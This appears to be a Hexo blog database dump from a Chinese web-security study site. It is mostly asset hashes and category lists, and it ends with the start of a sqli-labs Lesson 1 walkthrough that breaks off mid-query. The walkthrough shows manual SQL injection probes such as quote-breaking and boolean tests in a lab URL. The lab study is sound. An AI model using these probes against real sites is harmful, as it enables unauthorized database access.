d9d0568cf93afe2e3d","modified":1560965932493},{"_id":"public/img/sql/Lesson-12/4.png","hash":"085f9136f6ad2f9bb65efd8d02d4a27a329419e6","modified":1560965932493},{"_id":"public/img/sql/Lesson-20/11.png","hash":"d97d4aa88fd2e248f639d82a11d18ab0d78b814e","modified":1560965932493},{"_id":"public/img/sql/Lesson-21/006.png","hash":"ba5d5995ad5a774482eca5265767599f68f636e8","modified":1560965932493},{"_id":"public/img/sql/Lesson-34/003.png","hash":"bdcbc1318f8807236afad3d12b7ba117f43eced5","modified":1560965932494},{"_id":"public/img/sql/Lesson-35/006.png","hash":"12d30b2c792880d2b9ffd2e849fe1a9c4d4e5b6b","modified":1560965932494},{"_id":"public/img/sql/Lesson-40/001.png","hash":"8e48ff19b9e5140af6f92231726db76c4a7adc68","modified":1560965932494},{"_id":"public/img/sql/Lesson-55/005.png","hash":"37b4861c12744937270f460c5a6b31a7bed10bfb","modified":1560965932494},{"_id":"public/img/sql/Lesson-56/006.png","hash":"638b49f00e44ef679e3b08d1a2d6704d66faa244","modified":1560965932495},{"_id":"public/img/sql/Lesson-57/005.png","hash":"ec1785ca51325113d06a4351fac6bd079e05f2c3","modified":1560965932495},{"_id":"public/img/sql/Lesson-60/005.png","hash":"a4cb28fc1743a67f4b94ec9f569c2c2bf5cd547d","modified":1560965932495},{"_id":"public/img/sql/Lesson-61/002.png","hash":"6c981931b9abc7896ef6d8611127ef1a576e06bf","modified":1560965932496},{"_id":"public/img/sql/lesson2/5.png","hash":"763685f0b8423d93602b7d6ed7c2bf940fb314ff","modified":1560965932496},{"_id":"public/img/sql/lesson2/6.png","hash":"8a581266ed61a3bcbcf0991788af8bbe4c988fcd","modified":1560965932496},{"_id":"public/img/sql/lesson2/7.png","hash":"dbbf9bed15975543dd8e48ab687ff0f7a1f5d432","modified":1560965932497},{"_id":"public/img/sql/Lesson-18/10.png","hash":"a74b7f707ffb06ea8c5f620faf87710d275900a6","modified":1560965932497},{"_id":"public/img/sql/Lesson-63/004.png","hash":"a20d200e3f146b0ffa4857b8dae6787f9f30f1aa","modified":1560965932497},{"_id":"public/img/sql/Lesson-17/10.png","hash":"3cc05e91fc1e20941584b27e672818a95a79c4ff","modified":1560965932498},{"_id":"public/img/sql/Lesson-20/6.png","hash":"d4ec6a0d68078eaa4f7fb7eefa695751e2bd27e4","modified":1560965932498},{"_id":"public/img/sql/Lesson-65/004.png","hash":"22495f70907b4f7ec3999116b67b28fd25ec71a2","modified":1560965932498},{"_id":"public/img/sql/Lesson-54/007.png","hash":"252daf69ff94400ec0fcd4afeb025a9ffd9c6839","modified":1560965932498},{"_id":"public/img/sql/Lesson-18/9.png","hash":"74c3d3f71e953df9a59a78828052c1100f075bf8","modified":1560965932499},{"_id":"public/lib/font-awesome/css/font-awesome.min.css","hash":"512c7d79033e3028a9be61b540cf1a6870c896f8","modified":1560965932588},{"_id":"public/img/tcpdump/16.png","hash":"a7008973dd195610827d9f56992c9cc9b15e9c4c","modified":1560965932589},{"_id":"public/img/sql/Lesson-20/5.png","hash":"c1398c6258a32dea4228e06f21bc559bbaa9192f","modified":1560965932589},{"_id":"public/img/sql/Lesson-44/010.png","hash":"6a9c8df0d5c6770565043ffa0908c0d90158952c","modified":1560965932589},{"_id":"public/img/sql/Lesson-23/005.png","hash":"191ca6940905327860f80ea002ef2082996e4a6b","modified":1560965932590},{"_id":"public/img/sql/Lesson-38/013.png","hash":"130d7befd14d63b1bc629397e90bf6f87e6ade97","modified":1560965932590},{"_id":"public/img/sql/Lesson-4/4.png","hash":"7ae83e13a5b961566924f7ee3b33abf7bf5fdf34","modified":1560965932590},{"_id":"public/img/sql/Lesson-43/002.png","hash":"a484ee49d93e5eace1cacdaa04347246b8ef86ca","modified":1560965932590},{"_id":"public/img/sql/Lesson-58/005.png","hash":"4bdca08f632e330af44ed838fcc8ae33a8498991","modified":1560965932591},{"_id":"public/img/sql/Lesson-7/10.png","hash":"ce9de4091eb9fff1627bc93b10d173a5b42abdd6","modified":1560965932591},{"_id":"public/img/sql/Lesson-7/4.png","hash":"956a4f1f7546ade2e4d28922bbed7f781cb14d54","modified":1560965932591},{"_id":"public/img/sql/Lesson-8/1.png","hash":"c170e1be409fd8f1f213a539d44bef7b6532a598","modified":1560965932592},{"_id":"public/img/sql/Lesson-17/13.png","hash":"3797f5ac9f2d64042aea0a9a6b902ddb81068275","modified":1560965932592},{"_id":"public/img/sql/Lesson-21/001.png","hash":"777af0ff35cafd36dd48c3d72ecc43334d6a8e89","modified":1560965932592},{"_id":"public/img/sql/Lesson-21/007.png","hash":"2c43cf0730c0a210ca99d3cf7d0d5d692edb1be5","modified":1560965932592},{"_id":"public/img/sql/Lesson-32/006.png","hash":"022f54410cf0047bbdedcb35bbaac2844466b376","modified":1560965932593},{"_id":"public/img/sql/Lesson-60/004.png","hash":"9a2b87a0d8cb1b419c647fb8bc7ebef22d87648e","modified":1560965932593},{"_id":"public/img/sql/Lesson-61/004.png","hash":"5fa71db56dfc02c6cf5ee67a41935bd303c8849f","modified":1560965932593},{"_id":"public/img/sql/Lesson-17/14.png","hash":"3cbb4af1c670c6dce5697ae336174bf2fd5422b2","modified":1560965932593},{"_id":"public/img/sql/Lesson-31/004.png","hash":"97ef5e7d1382989968a6edcc1d5e96f66e68b6cb","modified":1560965932594},{"_id":"public/img/sql/Lesson-56/002.png","hash":"98edd7ef4561cd34f294f392e4976ed879125868","modified":1560965932594},{"_id":"public/img/tcpdump/7.png","hash":"d83f8fb7af9755c066c2c93e08d089b2f778f36d","modified":1560965932594},{"_id":"public/img/fileupload/upload-labs/013_2.png","hash":"8b5d3af3624aa5a32634db56bb680034cac02e57","modified":1560965932595},{"_id":"public/img/sql/Lesson-21/002.png","hash":"186a12d73d75e26a721c131fc5c730a7be3dfc71","modified":1560965932595},{"_id":"public/img/sql/Lesson-34/002.png","hash":"3e2051e33a952e9b8d6c3fbe0d8bb9e25b5618a0","modified":1560965932595},{"_id":"public/img/sql/Lesson-58/001.png","hash":"f5ba28675645632e14dc92ad71b7526ab5f9b316","modified":1560965932596},{"_id":"public/img/sql/Lesson-17/11.png","hash":"8e25dbbb94145850d585637a06859a82f3eb1bde","modified":1560965932596},{"_id":"public/img/sql/Lesson-49/002.png","hash":"ea7609f570434fa00230f6c2bd7647684141e734","modified":1560965932597},{"_id":"public/img/sql/Lesson-55/001.png","hash":"8f854a21e8a4f1ce3e55b7eeb6293961dde1edbb","modified":1560965932597},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1560965932683},{"_id":"public/lib/velocity/velocity.ui.js","hash":"6a1d101eab3de87527bb54fcc8c7b36b79d8f0df","modified":1560965932683},{"_id":"public/lib/font-awesome/css/font-awesome.css","hash":"0140952c64e3f2b74ef64e050f2fe86eab6624c8","modified":1560965932683},{"_id":"public/fonts/LinBiolinum_Rah.woff","hash":"f5775c065e0a451bedaa8126e2a2522204647be1","modified":1560965932684},{"_id":"public/fonts/LinBiolinum_RIah.woff","hash":"599e3d7737a675a929a008e4db9afde58b494398","modified":1560965932684},{"_id":"public/img/tcpdump/6.png","hash":"2f205e9cf4bcbea9ffdef67efa067462bbdf3b21","modified":1560965932684},{"_id":"public/img/sql/Lesson-23/007.png","hash":"9ac52f71ae405c694769112b1d5ea4693f3354bf","modified":1560965932684},{"_id":"public/img/sql/Lesson-32/001.png","hash":"9b08c20c291d40ba9175a34cdda8051a675783cc","modified":1560965932684},{"_id":"public/img/sql/Lesson-32/009.png","hash":"cdd6281be138003ce6a35c7f5bee7c04c8ea5328","modified":1560965932685},{"_id":"public/img/sql/Lesson-35/005.png","hash":"7af51f0b34736fcd1708b85652d9277e52c8ee5a","modified":1560965932685},{"_id":"public/img/sql/Lesson-44/009.png","hash":"65f667b99d82acb8a5ac0e47090865b2e06684d8","modified":1560965932685},{"_id":"public/img/tcpdump/9.png","hash":"04638bc12507cc04068768e9c4737faf7eaaf210","modified":1560965932685},{"_id":"public/img/sql/Lesson-43/003.png","hash":"2aa7c370570b62a9d71feecfaa63bf00695d182d","modified":1560965932686},{"_id":"public/img/sql/Lesson-28/006.png","hash":"8dbd555b01c404dd078afb221878b054e76f9a78","modified":1560965932686},{"_id":"public/img/sql/Lesson-57/003.png","hash":"03a14dbf64d50d574e255d90d579ec7c8ac85be1","modified":1560965932686},{"_id":"public/img/sql/Lesson-56/003.png","hash":"d921e3a47964c6c2fcc1696fb968d45c4bf567b7","modified":1560965932686},{"_id":"public/img/sql/Lesson-57/002.png","hash":"fe9b9cbb1e27092957e69050bae096ce36632788","modified":1560965932686},{"_id":"public/img/sql/Lesson-56/004.png","hash":"4277b936b7f9011bf97f3e26a3e61cbb7ed77b37","modified":1560965932687},{"_id":"public/img/sql/Lesson-55/003.png","hash":"2d1ea66a042284af75cb891bb176f37d8be4cc26","modified":1560965932687},{"_id":"public/img/sql/Lesson-54/001.png","hash":"b60e484caa699ac07c1efcd778858c91dc016793","modified":1560965932687},{"_id":"public/img/sql/Lesson-54/002.png","hash":"9a24cb553e40db7b2c6e2caec6632ed50dd52ea4","modified":1560965932687},{"_id":"public/img/sql/Lesson-54/003.png","hash":"b3dda645030d47c1f41bdf41e05563550c78cae6","modified":1560965932687},{"_id":"public/img/sql/Lesson-56/001.png","hash":"fbf73686931e80a14191a4605ba2f188d10fa582","modified":1560965932688},{"_id":"public/img/knowledge/Middleware_Parsing_vulnerability/005_2.png","hash":"b3ece40536ca169f3c437f4afe61650f91a7cc8f","modified":1560965932688},{"_id":"public/img/sql/Lesson-25/001.png","hash":"f6372913edaf5799e203ba6b8a4c3b6f5013b5e6","modified":1560965932688},{"_id":"public/img/sql/Lesson-27/003.png","hash":"477c1864e414f5917f1ed8d6de599133d8d12bae","modified":1560965932688},{"_id":"public/img/sql/Lesson-28/004.png","hash":"29105c550ea544c49e7743f98b163b374734c1e9","modified":1560965932689},{"_id":"public/img/cms/MetInfo/Getshell/4.png","hash":"109ddecdc24c376a5a0a93098b02897a6ade2a42","modified":1560965932689},{"_id":"public/img/sql/Lesson-28/003.png","hash":"7fecc36d4648fc1766b5a18770084f0f7fdb2aca","modified":1560965932689},{"_id":"public/fonts/LinBiolinum_RBah.woff","hash":"af3aaf51e7b72ab26135b3320aa51c0b9eb39e80","modified":1560965932766},{"_id":"public/img/sql/Lesson-36/001.png","hash":"304a7c6046f96a990fca7b473767b475d2811788","modified":1560965932768},{"_id":"public/img/sql/Lesson-43/008.png","hash":"55cead9b63a02943a5ffd2b6d35c75ed059d2907","modified":1560965932770},{"_id":"public/img/sql/Lesson-64/004.png","hash":"2b665d3aba0a7971e92f4ea5d999687df1ca1975","modified":1560965932770},{"_id":"public/img/sql/Lesson-8/10.png","hash":"bed80410b401b23abcfb5e952325113a836627e2","modified":1560965932771},{"_id":"public/img/sql/Lesson-20/3.png","hash":"a31c4d1fd8e564e240943f0bacedb9b770db3b56","modified":1560965932772},{"_id":"public/img/sql/Lesson-58/003.png","hash":"f0604a12fa8c4cb96724f1040e600d3a5f52d0e6","modified":1560965932772},{"_id":"public/img/sql/Lesson-59/005.png","hash":"8661d86c2979c752e99b39f45a6a61ec95744213","modified":1560965932772},{"_id":"public/img/sql/Lesson-61/003.png","hash":"4d987b6a1e3c50d4b07166146e44ec1918efd95b","modified":1560965932776},{"_id":"public/img/sql/Lesson-61/005.png","hash":"d08e1e39ff6a06d615ba1dece70862be0e366860","modified":1560965932777},{"_id":"public/img/sql/Lesson-57/004.png","hash":"5274910b083529a14e002bd89f1ddbb83ea7d7cb","modified":1560965932778},{"_id":"public/img/sql/Lesson-25a/003.png","hash":"41f8b9334f6419bc6aca7f01e4771e24ea946418","modified":1560965932778},{"_id":"public/img/sql/Lesson-55/002.png","hash":"fd78d7db833c4f74c9c739a8fea6a7eb067dcbed","modified":1560965932780},{"_id":"public/img/sql/Lesson-18/2.png","hash":"fc13bf9359285dd399f090b039ed53f38188817e","modified":1560965932781},{"_id":"public/img/sql/Lesson-27/001.png","hash":"dea889e1ea909695d1ff2631a4a3912c5c612505","modified":1560965932781},{"_id":"public/img/sql/Lesson-27a/004.png","hash":"5de5861478971a3e9caed2966612fadbb60e5f04","modified":1560965932783},{"_id":"public/img/sql/Lesson-30/005.png","hash":"d0c558315fd0291d602f0eb3d59900a889a37b78","modified":1560965932784},{"_id":"public/img/sql/Lesson-31/001.png","hash":"5cdde2d14d0c9242d5a4472bcd9930bc08b12e7f","modified":1560965932786},{"_id":"public/img/sql/Lesson-25/007.png","hash":"2f39498ee60b0b604aee249132f0708c591469a8","modified":1560965932786},{"_id":"public/img/sql/Lesson-25a/002.png","hash":"753aeb3223b9c12ac0acbd4b2b582bdd17d43769","modified":1560965932787},{"_id":"public/img/sql/Lesson-27a/001.png","hash":"3185317395be9d1b65bcc2671622701e88d437f4","modified":1560965932787},{"_id":"public/img/sql/Lesson-28a/001.png","hash":"4212d69b2e327def992dc9d79d2e60db288956d4","modified":1560965932787},{"_id":"public/img/sql/Lesson-28a/003.png","hash":"2f424cb2ec3507337d90a963f51ffccf4853394b","modified":1560965932788},{"_id":"public/img/sql/Lesson-30/007.png","hash":"a70b9202965142a821764433d5211d5c41a91b73","modified":1560965932788},{"_id":"public/img/sql/Lesson-25a/001.png","hash":"ae62346d9db8cf33614938b92423f4fd0ebffc2a","modified":1560965932790},{"_id":"public/img/sql/Lesson-29/005.png","hash":"4baa3270df0b9db80cd5a658e18425be755d97f0","modified":1560965932790},{"_id":"public/img/sql/Lesson-29/006.png","hash":"feb6a64f3b56d390df218fb9f2edefc9cee6f347","modified":1560965932791},{"_id":"public/img/sql/Lesson-30/008.png","hash":"cc70b07dcefb6c8264532b2651e1f9dc8fb3743a","modified":1560965932791},{"_id":"public/img/sql/Lesson-26a/003.png","hash":"0328c8b2c391b2d9c90095340855b862f5809b82","modified":1560965932792},{"_id":"public/img/sql/Lesson-26a/005.png","hash":"34d61dbf18e091ad256531376ebc693298b2a091","modified":1560965932792},{"_id":"public/img/sql/Lesson-29/009.png","hash":"7975b61bae5c7ca8e0d2ce487d40ebcb314cd363","modified":1560965932793},{"_id":"public/img/sql/Lesson-26a/002.png","hash":"778b4c020768ea0977c7612087ee5618bbdf0a8c","modified":1560965932793},{"_id":"public/img/sql/Lesson-29/004.png","hash":"da4fb0c2b27011f4692d481e9ad4925b5458017f","modified":1560965932794},{"_id":"public/img/sql/Lesson-29/008.png","hash":"088ff6c924e30ce756e67cbc5c76b720f72b7842","modified":1560965932794},{"_id":"public/img/sql/Lesson-29/007.png","hash":"458890a9f608bd170d8867f58a760633735b4423","modified":1560965932794},{"_id":"public/img/sql/Lesson-28/002.png","hash":"cfbff52bf5861a30019279c1cb5bc735d31f8655","modified":1560965932795},{"_id":"public/img/tcpdump/3.png","hash":"269e8e555ce7823d8f169e7abe34351d8ba12a41","modified":1560965932835},{"_id":"public/img/sql/Lesson-21/005.png","hash":"c48f90aa0f813a17257ed93452394613144083e0","modified":1560965932835},{"_id":"public/img/sql/Lesson-58/002.png","hash":"f8cd3311ad5b635343e91b82b33bae29e300aeb7","modified":1560965932836},{"_id":"public/img/sql/Lesson-58/004.png","hash":"cbf43379bda2883a2a6cbb9a121399f183027f09","modified":1560965932837},{"_id":"public/img/sql/Lesson-60/003.png","hash":"0e74337ec097ab80abe601082f7790c37cd0470c","modified":1560965932837},{"_id":"public/img/sql/Lesson-28/005.png","hash":"4786f19aa9676e53f797532f0f6e626d645fc65c","modified":1560965932837},{"_id":"public/img/sql/Lesson-56/005.png","hash":"5ce016e3b9b648ce4301c20d75bbf78333b61bc0","modified":1560965932838},{"_id":"public/img/sql/Lesson-26/001.png","hash":"a1af553825acfc16a4f285bfd12d940315eeec6b","modified":1560965932838},{"_id":"public/img/sql/Lesson-26/003.png","hash":"c895a7d1bd244c89c3ae8801a01835977a7f3ad7","modified":1560965932838},{"_id":"public/img/sql/Lesson-26/006.png","hash":"0e160721580e259ceae8ad2ddd0fed9e576c1a76","modified":1560965932839},{"_id":"public/img/sql/Lesson-27/004.png","hash":"59538eac9da0cf75cd52b389b8c8016806e8ac61","modified":1560965932839},{"_id":"public/img/sql/Lesson-27a/003.png","hash":"163300399ea42e94cf4184c48adf52a3239b9549","modified":1560965932840},{"_id":"public/img/sql/Lesson-27a/005.png","hash":"f8135542ce8b063641dce0f44797589b6aa5e255","modified":1560965932840},{"_id":"public/img/sql/Lesson-30/003.png","hash":"cdf7c1307e01793126c8e530701dcd37dfc98d40","modified":1560965932841},{"_id":"public/img/sql/Lesson-25/005.png","hash":"2184751ca0d3b3c6d605b1754b507b860b518dee","modified":1560965932842},{"_id":"public/img/sql/Lesson-30/009.png","hash":"76600d9841722b7b8f43c413024f874671ec8f3d","modified":1560965932842},{"_id":"public/img/sql/Lesson-26a/007.png","hash":"610b278ca598e28d50ae0660acea21e70938aa4d","modified":1560965932843},{"_id":"public/img/sql/Lesson-27/002.png","hash":"f8a64c4ebeb0b15ec1531ed777ad14c3cbb72de4","modified":1560965932843},{"_id":"public/img/sql/Lesson-28/001.png","hash":"1fe2f7ce022b48ab2ad21962df97a2652050bcef","modified":1560965932844},{"_id":"public/img/sql/Lesson-28a/004.png","hash":"d9d49b48c91d2e1dffbfb3c8269879af281b6665","modified":1560965932844},{"_id":"public/img/sql/Lesson-28a/006.png","hash":"5b7ac6a5f6b63106f663b649ef968d815d81a303","modified":1560965932844},{"_id":"public/img/sql/Lesson-30/004.png","hash":"b980702101f1de6ca802e545b5eff47c01d1fb01","modified":1560965932845},{"_id":"public/img/sql/Lesson-30/006.png","hash":"1784dc21c1655bcea6a4843b4e21aec1e5be2ba8","modified":1560965932845},{"_id":"public/img/sql/Lesson-28a/005.png","hash":"b74aef1f33fc027a5aa2015b3c9819cd7d16c61b","modified":1560965932846},{"_id":"public/img/sql/Lesson-30/001.png","hash":"766640e03282c6d6191b9f5b3432b166ceb9f529","modified":1560965932846},{"_id":"public/img/sql/Lesson-26a/006.png","hash":"ba4cf3f32d2ee6c3f7a9ace3fa7e75f569cfeea2","modified":1560965932847},{"_id":"public/img/sql/Lesson-25/003.png","hash":"4cb62f009ca77ad1937c267b60501ec0ff0d5cce","modified":1560965932877},{"_id":"public/img/sql/Lesson-26a/004.png","hash":"0cce896b5985f900d359c2f9b9927d7c810f3b7c","modified":1560965932877},{"_id":"public/img/sql/Lesson-29/001.png","hash":"09d70d23c1ce4a506e52ab9e02a4d390ed9838e1","modified":1560965932877},{"_id":"public/img/sql/Lesson-31/002.png","hash":"4d94fa7ea8baa4d8ea46a2c96e3c122413ec539e","modified":1560965932877},{"_id":"public/img/sql/Lesson-25/004.png","hash":"b74ec11975a03dbb6048154afb9f7cd055fd4e20","modified":1560965932878},{"_id":"public/img/sql/Lesson-25a/004.png","hash":"06848cea6297ccabec082162bde3be98322964f0","modified":1560965932878},{"_id":"public/img/sql/Lesson-60/001.png","hash":"c440b750310ea0e15962de49292816bf670b1d1f","modified":1560965932965},{"_id":"public/img/sql/Lesson-27a/002.png","hash":"55336242a8559b2753b5711b4b9696e08dfe91e7","modified":1560965932965},{"_id":"public/img/sql/Lesson-57/001.png","hash":"a874eedba2c1eb52636cc534a22711589943464a","modified":1560965932965},{"_id":"public/img/tcpdump/13.png","hash":"af3c5dc52b1be74599d55eb0e5652224033b2a04","modified":1560965932968},{"_id":"public/img/sql/Lesson-26a/001.png","hash":"e701de1a83a7c7e4fa25c057accac930da7f3814","modified":1560965932970},{"_id":"public/img/sql/Lesson-26/004.png","hash":"3fb44a5b45baa8f6f23eada1fe48987d3cc3bae3","modified":1560965932971},{"_id":"public/img/tcpdump/14.png","hash":"645f2ae1914d596dedcb225462354eb3bc1579ef","modified":1560965932971},{"_id":"public/img/sql/Lesson-55/004.png","hash":"491d5bf14a4046e085f7cf5afaa26a6b55eea184","modified":1560965933165},{"_id":"public/img/sql/Lesson-28/007.png","hash":"d6bc499982930a1f428bebcca78430baecd796d5","modified":1560965933166},{"_id":"public/img/sql/Lesson-26/005.png","hash":"c9dafefe829607b554f28ea5873a291f94d24c4b","modified":1560965933166},{"_id":"public/live2dw/lib/L2Dwidget.0.min.js.map","hash":"35e71cc2a130199efb167b9a06939576602f0d75","modified":1560965933166},{"_id":"public/lib/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1560965933174},{"_id":"public/img/sql/Lesson-25/002.png","hash":"1827c355c15adb09bf1109ae8156edb8a553b04c","modified":1560965933208},{"_id":"public/fonts/LinBiolinum_RBah.eot","hash":"c591024cb23a2b26286a032377dafce7e2d15566","modified":1560965933211},{"_id":"public/img/tcpdump/15.png","hash":"61ef94b9e1278a386e8a576516174b1d3449442b","modified":1560965933214},{"_id":"public/fonts/LinBiolinum_Rah.eot","hash":"28505bf2f9698218e76b1bfd3cd69e275887f36e","modified":1560965933216},{"_id":"public/fonts/LinBiolinum_RBah.ttf","hash":"50ee376e29207e4e8d9dc2c936efe4997451859d","modified":1560965933217},{"_id":"public/fonts/LinBiolinum_Rah.ttf","hash":"73119c2f63274fd0825c53ec639511ae2f1601ce","modified":1560965933217},{"_id":"public/fonts/LinBiolinum_RIah.eot","hash":"71f1a4a78e81d8c12e77846950d1945015f9b409","modified":1560965933218},{"_id":"public/fonts/LinBiolinum_RIah.ttf","hash":"79289593787b336918d71bd624266c6d1ac26c97","modified":1560965933220},{"_id":"public/lib/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1560965933225}],"Category":[{"name":"环境搭建","_id":"cjx3istbc00054dsb45xgw15v"},{"name":"CSRF","_id":"cjx3istbm000c4dsbl0dnbeuu"},{"name":"XSS","_id":"cjx3istbq000i4dsbljovwxib"},{"name":"CMS","_id":"cjx3istc6000z4dsb4qqvyaa4"},{"name":"工具","_id":"cjx3istc900184dsbzhasga0m"},{"name":"ubuntu","_id":"cjx3istcd001e4dsblc0q0pf1"},{"name":"dedecms","_id":"cjx3istcj001l4dsbvbvoleok"},{"name":"整理","_id":"cjx3istcm001q4dsbo4j6r2zc"},{"name":"渗透","parent":"cjx3istc6000z4dsb4qqvyaa4","_id":"cjx3istcs00224dsbeeal0iab"},{"name":"php","_id":"cjx3istcw002a4dsb3dv24xrr"},{"name":"sql注入","_id":"cjx3istd1002h4dsb92zo7sle"},{"name":"python","_id":"cjx3istd7002t4dsb94llfxbp"},{"name":"杂项","_id":"cjx3istda002z4dsb84ni3rpg"},{"name":"文件包含","_id":"cjx3istez005j4dsbz38r94ju"},{"name":"应急响应","_id":"cjx3istl500ah4dsbnsma8iug"},{"name":"文件上传","_id":"cjx3istpb00at4dsb50m67qms"}],"Data":[],"Page":[{"_content":"<!DOCTYPE HTML>\n<html>\n<head>\n  <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\"/>\n  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n  <meta name=\"robots\" content=\"all\" />\n  <meta name=\"robots\" content=\"index,follow\"/>\n  <link rel=\"stylesheet\" type=\"text/css\" href=\"https://qzone.qq.com/gy/404/style/404style.css\">\n</head>\n<body>\n  <script type=\"text/plain\" src=\"http://www.qq.com/404/search_children.js\"\n          charset=\"utf-8\" homePageUrl=\"/\"\n          homePageName=\"返回主页\">\n  </script>\n  <script src=\"https://qzone.qq.com/gy/404/data.js\" charset=\"utf-8\"></script>\n  <script src=\"https://qzone.qq.com/gy/404/page.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n","source":"404.html","raw":"<!DOCTYPE HTML>\n<html>\n<head>\n  <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\"/>\n  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n  <meta name=\"robots\" content=\"all\" />\n  <meta name=\"robots\" content=\"index,follow\"/>\n  <link rel=\"stylesheet\" type=\"text/css\" href=\"https://qzone.qq.com/gy/404/style/404style.css\">\n</head>\n<body>\n  <script type=\"text/plain\" src=\"http://www.qq.com/404/search_children.js\"\n          charset=\"utf-8\" homePageUrl=\"/\"\n          homePageName=\"返回主页\">\n  </script>\n  <script src=\"https://qzone.qq.com/gy/404/data.js\" charset=\"utf-8\"></script>\n  <script src=\"https://qzone.qq.com/gy/404/page.js\" charset=\"utf-8\"></script>\n</body>\n</html>\n","date":"2019-06-19T17:23:13.379Z","updated":"2019-06-19T17:23:13.379Z","path":"404.html","title":"","comments":1,"layout":"page","_id":"cjx3isswt00004dsbxoxgesza","content":"<!DOCTYPE HTML>\n<html>\n<head><meta name=\"generator\" content=\"Hexo 3.9.0\">\n  <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\">\n  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">\n  <meta name=\"robots\" content=\"all\">\n  <meta name=\"robots\" content=\"index,follow\">\n  <link rel=\"stylesheet\" type=\"text/css\" href=\"https://qzone.qq.com/gy/404/style/404style.css\">\n</head>\n<body>\n  <script type=\"text/plain\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homepageurl=\"/\" homepagename=\"返回主页\">\n  </script>\n  <script src=\"https://qzone.qq.com/gy/404/data.js\" charset=\"utf-8\"></script>\n  <script src=\"https://qzone.qq.com/gy/404/page.js\" charset=\"utf-8\"></script>\n<script src=\"/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05\"></script><script>L2Dwidget.init({\"pluginModelPath\":\"assets/\",\"model\":{\"jsonPath\":\"/live2dw/assets/hijiki.model.json\"},\"display\":{\"position\":\"right\",\"width\":150,\"height\":300,\"bottom\":-40},\"mobile\":{\"show\":false},\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false});</script></body>\n</html>\n","site":{"data":{}},"excerpt":"","more":"<!DOCTYPE HTML>\n<html>\n<head><meta name=\"generator\" content=\"Hexo 3.9.0\">\n  <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8;\">\n  <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">\n  <meta name=\"robots\" content=\"all\">\n  <meta name=\"robots\" content=\"index,follow\">\n  <link rel=\"stylesheet\" type=\"text/css\" href=\"https://qzone.qq.com/gy/404/style/404style.css\">\n</head>\n<body>\n  <script type=\"text/plain\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homepageurl=\"/\" homepagename=\"返回主页\">\n  </script>\n  <script src=\"https://qzone.qq.com/gy/404/data.js\" charset=\"utf-8\"></script>\n  <script src=\"https://qzone.qq.com/gy/404/page.js\" charset=\"utf-8\"></script>\n<script src=\"/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05\"></script><script>L2Dwidget.init({\"pluginModelPath\":\"assets/\",\"model\":{\"jsonPath\":\"/live2dw/assets/hijiki.model.json\"},\"display\":{\"position\":\"right\",\"width\":150,\"height\":300,\"bottom\":-40},\"mobile\":{\"show\":false},\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false});</script></body>\n</html>\n"},{"title":"关于","date":"2018-09-16T12:19:44.000Z","_content":"","source":"about/index.md","raw":"---\ntitle: 关于\ndate: 2018-09-16 20:19:44\n---\n","updated":"2019-06-19T17:23:13.404Z","path":"about/index.html","comments":1,"layout":"page","_id":"cjx3istb200014dsbcb02d6a9","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"archives","date":"2018-09-16T12:20:06.000Z","_content":"","source":"archives/index.md","raw":"---\ntitle: archives\ndate: 2018-09-16 20:20:06\n---\n","updated":"2019-06-19T17:23:13.404Z","path":"archives/index.html","comments":1,"layout":"page","_id":"cjx3istb900034dsbh1ap9qfl","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"分类","date":"2018-09-16T12:20:21.000Z","type":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2018-09-16 20:20:21\ntype: \"categories\"\ncomments: false\n---\n","updated":"2019-06-19T17:23:13.404Z","path":"categories/index.html","layout":"page","_id":"cjx3istbf00074dsb6yn9y0i8","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"标签","date":"2018-09-16T12:19:55.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2018-09-16 20:19:55\ntype: \"tags\"\ncomments: false\n---\n","updated":"2019-06-19T17:23:14.510Z","path":"tags/index.html","layout":"page","_id":"cjx3istbi00094dsbhpuhfa9t","content":"","site":{"data":{}},"excerpt":"","more":""},{"_content":"# sqli-labs lession 1 (基于错误的GET单引号字符型注入) #\n---\n## 登录界面 ##\n![1](https://i.imgur.com/7iOF74D.png)\n## 手注 ##\n\n### 判断注入类型 ###\n>sqli-labs 第一课很人性化地给予提示,在url处添加id。\n\n\n`http://10.60.250.214/Less-1/?id=1`\n![2](https://i.imgur.com/wwGtJ0S.png)\n>由于是get请求方法,以后碰到就直接填写了。\n\n输入单引号\n\n`http://10.60.250.214/Less-1/?id=1'`\n\n![3](https://i.imgur.com/Kgh75tO.png)\n\n引起报错\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`\n\n根据报错信息,猜测加入的id'参数在SQL语句中应该被对称的单引号包含。\n\n继续验证猜想:\n\n`http://10.60.250.214/Less-1/?id=1' and '1'='1`\n\n页面正常，这里不贴图了\n\n继续检验\n\n`http://10.60.250.214/Less-1/?id=1' and '1'='2`\n\n页面异常\n\n![4](https://i.imgur.com/6u8cFW1.png)\n\n存在字符型的注入\n\n在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分\n\n![5](https://i.imgur.com/vibteUL.png)\n\n`$sql=\"SELECT * FROM users 